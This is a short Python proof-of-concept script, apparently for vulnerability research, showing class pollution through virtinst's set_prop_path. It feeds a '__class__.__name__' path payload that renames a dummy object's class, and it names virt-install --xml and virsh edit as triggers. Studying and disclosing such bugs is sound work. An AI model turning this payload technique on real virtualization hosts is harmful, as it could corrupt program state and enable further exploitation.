# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: set_prop_path (via CLI)
# Type: get-attr-set-attr
# Trigger: virt-install CLI with --xml option or virsh edit

from virtinst.xmlutil import set_prop_path

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = "__class__.__name__"

def run_poc():
  set_prop_path(target, PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
